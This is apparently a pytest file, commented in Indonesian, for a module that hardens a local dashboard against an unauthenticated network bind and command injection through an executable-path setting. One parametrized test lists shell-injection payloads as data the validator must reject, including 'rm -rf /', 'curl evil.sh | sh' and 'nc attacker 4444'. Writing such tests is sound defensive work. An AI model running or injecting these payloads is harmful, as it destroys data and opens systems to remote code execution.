"""
Test untuk bug CRITICAL #3 dan #2.

#3 -- web_ui.py bind ("0.0.0.0", PORT) dan tidak punya satu pun pemeriksaan auth
      (grep Authorization|auth_token|login_required|check_auth|X-Api-Key -> 0 hasil).
      Terbukti live: lsof menunjukkan `TCP *:5000 (LISTEN)` dan
      `curl http://127.0.0.1:5000/api/status` -> HTTP 200 tanpa credential.

#2 -- POST /api/settings mengisi os.environ["QODER_BIN"] dari body tanpa validasi.
      _launch() meneruskan {**os.environ} ke proses anak, dan llm_router memakai
      nilai itu sebagai argv[0] subprocess.Popen -> remote code execution.

Kontrak yang diinginkan:
  * default bind loopback; membuka ke jaringan wajib opt-in DAN wajib token
  * token, kalau di-set, berlaku untuk semua klien termasuk loopback
  * tanpa token, hanya klien loopback yang boleh
  * nilai executable (qoder_bin) harus file yang benar-benar ada dan bisa dieksekusi
"""
import os
import stat
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import web_security


# ── #3a: alamat bind ─────────────────────────────────────────────────────────
def test_default_bind_adalah_loopback(monkeypatch):
    """Tanpa konfigurasi apa pun, dashboard tidak boleh terlihat dari jaringan."""
    monkeypatch.delenv("UI_HOST", raising=False)
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.resolve_bind_host() == "127.0.0.1"


def test_bind_non_loopback_ditolak_kalau_token_kosong(monkeypatch):
    """UI_HOST=0.0.0.0 tanpa token harus diturunkan paksa ke loopback."""
    monkeypatch.setenv("UI_HOST", "0.0.0.0")
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.resolve_bind_host() == "127.0.0.1"


def test_bind_non_loopback_diizinkan_kalau_token_ada(monkeypatch):
    monkeypatch.setenv("UI_HOST", "0.0.0.0")
    monkeypatch.setenv("UI_TOKEN", "rahasia-panjang")

    assert web_security.resolve_bind_host() == "0.0.0.0"


def test_bind_loopback_eksplisit_tetap_diizinkan(monkeypatch):
    monkeypatch.setenv("UI_HOST", "127.0.0.1")
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.resolve_bind_host() == "127.0.0.1"


# ── #3b: otorisasi per-request ───────────────────────────────────────────────
def test_klien_loopback_boleh_masuk_selama_token_belum_diset(monkeypatch):
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.is_authorized("127.0.0.1", None) is True


@pytest.mark.parametrize("remote", ["192.168.1.50", "10.0.0.7", "8.8.8.8"])
def test_klien_jaringan_ditolak_tanpa_token(monkeypatch, remote):
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.is_authorized(remote, None) is False


def test_token_walaupun_dari_loopback_bila_token_sudah_diset(monkeypatch):
    """Begitu token di-set, ia berlaku untuk semua klien -- tidak ada jalur belakang."""
    monkeypatch.setenv("UI_TOKEN", "rahasia-panjang")

    assert web_security.is_authorized("127.0.0.1", None) is False


def test_token_salah_ditolak(monkeypatch):
    monkeypatch.setenv("UI_TOKEN", "rahasia-panjang")

    assert web_security.is_authorized("192.168.1.50", "salah") is False
    assert web_security.is_authorized("127.0.0.1", "salah") is False


def test_token_benar_diterima(monkeypatch):
    monkeypatch.setenv("UI_TOKEN", "rahasia-panjang")

    assert web_security.is_authorized("192.168.1.50", "rahasia-panjang") is True
    assert web_security.is_authorized("127.0.0.1", "rahasia-panjang") is True


def test_ipv6_loopback_diperlakukan_sebagai_lokal(monkeypatch):
    monkeypatch.delenv("UI_TOKEN", raising=False)

    assert web_security.is_authorized("::1", None) is True


# ── #2: validasi nilai executable ────────────────────────────────────────────
def test_path_tidak_ada_ditolak():
    ok, reason = web_security.validate_executable("/tmp/pasti-tidak-ada-xyz/qoder")

    assert ok is False
    assert reason


def test_file_ada_tapi_tidak_executable_ditolak(tmp_path):
    f = tmp_path / "bukan-binary"
    f.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
    f.chmod(0o644)

    ok, reason = web_security.validate_executable(str(f))

    assert ok is False
    assert reason


def test_nilai_kosong_ditolak():
    ok, _ = web_security.validate_executable("")
    assert ok is False

    ok, _ = web_security.validate_executable("   ")
    assert ok is False


@pytest.mark.parametrize("payload", [
    "qoder; rm -rf /",
    "qoder && curl evil.sh | sh",
    "qoder\n/etc/passwd",
    "$(whoami)",
    "`id`",
    "qoder | nc attacker 4444",
])
def test_payload_shell_ditolak(payload):
    ok, reason = web_security.validate_executable(payload)

    assert ok is False, f"payload {payload!r} seharusnya ditolak"
    assert reason


def test_direktori_ditolak(tmp_path):
    ok, _ = web_security.validate_executable(str(tmp_path))

    assert ok is False


def test_binary_executable_asli_diterima(tmp_path):
    """Penjaga regresi: jalur sah (binary nyata yang bisa dieksekusi) tidak boleh ikut ditolak."""
    f = tmp_path / "qoder"
    f.write_text("#!/bin/sh\necho ok\n", encoding="utf-8")
    f.chmod(f.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    ok, reason = web_security.validate_executable(str(f))

    assert ok is True, f"binary valid ditolak: {reason}"


def test_nama_perintah_yang_ada_di_PATH_diterima():
    """"sh" tanpa path harus resolve lewat PATH, seperti shutil.which di llm_router."""
    ok, reason = web_security.validate_executable("sh")

    assert ok is True, f"perintah di PATH ditolak: {reason}"
